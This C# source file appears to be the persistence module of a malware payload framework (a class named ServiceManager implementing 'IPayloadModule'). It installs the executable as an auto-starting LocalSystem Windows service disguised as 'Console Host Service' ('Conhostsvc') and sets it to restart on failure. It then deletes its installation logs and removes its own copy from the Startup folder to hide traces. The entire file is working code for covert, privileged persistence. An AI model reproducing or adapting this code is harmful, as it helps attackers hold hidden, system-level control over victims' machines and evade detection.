using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration.Install;
using System.Linq;
using System.Reflection;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;

namespace zort
{
    [RunInstaller(true)]
    public class ServiceInstaller : Installer
    {

        private readonly System.ServiceProcess.ServiceInstaller serviceInstaller;
        private readonly ServiceProcessInstaller processInstaller;

        public ServiceInstaller()
        {
            serviceInstaller = new System.ServiceProcess.ServiceInstaller();
            processInstaller = new ServiceProcessInstaller
            {
                Account = ServiceAccount.LocalSystem,
            };

            serviceInstaller.StartType = ServiceStartMode.Automatic;
            serviceInstaller.ServiceName = "Conhostsvc";
            serviceInstaller.DisplayName = "Console Host Service";
            serviceInstaller.Description = "Provides console hosting capabilities for applications requiring background processing.";

            // Configure the service to always restart on failure
            serviceInstaller.ServicesDependedOn = new string[] { }; // Add dependencies if needed
            serviceInstaller.AfterInstall += (sender, args) =>
            {
                using (var process = new System.Diagnostics.Process())
                {
                    process.StartInfo.FileName = "sc";
                    process.StartInfo.Arguments = $"failure \"{serviceInstaller.ServiceName}\" reset= 0 actions= restart/5000";
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.UseShellExecute = false;
                    process.Start();
                    process.WaitForExit();
                }
            };

            Installers.Add(serviceInstaller);
            Installers.Add(processInstaller);
        }
    }

    public class ServiceManager : IPayloadModule
    {
        const bool DEBUG_REINSTALL = !!!true;

        public ElevationType ElevationType => ElevationType.Elevated;

        public string ModuleName => "ServiceManager";

        public void Start()
        {
            //check if we are running as a service
            if (!Environment.UserInteractive)
            {
                ModuleLogger.Log(this, "Running in service mode. no need to install service. Exiting...");
                return;
            }

            // Check if the service is already installed
            var serviceName = "conhostsvc";
            var service = ServiceController.GetServices().FirstOrDefault(s => s.ServiceName == serviceName);
            if (service != null)
            {
                if (DEBUG_REINSTALL)
                {
                    ModuleLogger.Log(this, "DEBUG: Service is already installed. Reinstalling...");
                    // Uninstall the service
                    ModuleLogger.Log(this, "Stopping service...");
                    using (var sc = new ServiceController(serviceName))
                    {
                        if (sc.Status != ServiceControllerStatus.Stopped)
                        {
                            sc.Stop();
                            sc.WaitForStatus(ServiceControllerStatus.Stopped);
                        }
                    }
                    ModuleLogger.Log(this, "Uninstalling service...");
                    ManagedInstallerClass.InstallHelper(new string[] { "/u", Assembly.GetExecutingAssembly().Location });
                }
                else
                {
                    ModuleLogger.Log(this, "Service is already installed.");
                    return;
                }
            }
            try
            {

                // Install the service
                ModuleLogger.Log(this, "Starting service installation...");
                ManagedInstallerClass.InstallHelper(new string[] { Assembly.GetExecutingAssembly().Location });
                // Delete Log files ending with InstallLog and InstallState in current directory
                var logFiles = System.IO.Directory.GetFiles(Environment.CurrentDirectory, "*.InstallLog");
                foreach (var logFile in logFiles)
                {
                    System.IO.File.Delete(logFile);
                }
                logFiles = System.IO.Directory.GetFiles(Environment.CurrentDirectory, "*.InstallState");
                foreach (var logFile in logFiles)
                {
                    System.IO.File.Delete(logFile);
                }
                ModuleLogger.Log(this, "Service installation completed.");


                // Start the service
                ModuleLogger.Log(this, "Starting service...");
                using (var sc = new ServiceController(serviceName))
                {
                    if (sc.Status != ServiceControllerStatus.Running)
                    {
                        sc.Start();
                        sc.WaitForStatus(ServiceControllerStatus.Running);
                    }
                }

                // Remove myself from the startup folder
                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                string startupFile = System.IO.Path.Combine(startupFolder, Assembly.GetExecutingAssembly().GetName().Name + ".exe");
                if (System.IO.File.Exists(startupFile))
                {
                    System.IO.File.Delete(startupFile);
                    ModuleLogger.Log(this, "Removed myself from startup folder.");
                }
                else
                {
                    ModuleLogger.Log(this, "Not in startup folder. No need to remove.");
                }
            }
            catch (Exception ex)
            {
                ModuleLogger.Log(this, $"Error installing service: {ex.Message}");
            }
        }

        public void Stop()
        {
            //Dont do anything. this runs only once therefore does not need to be stopped
        }
    }
}
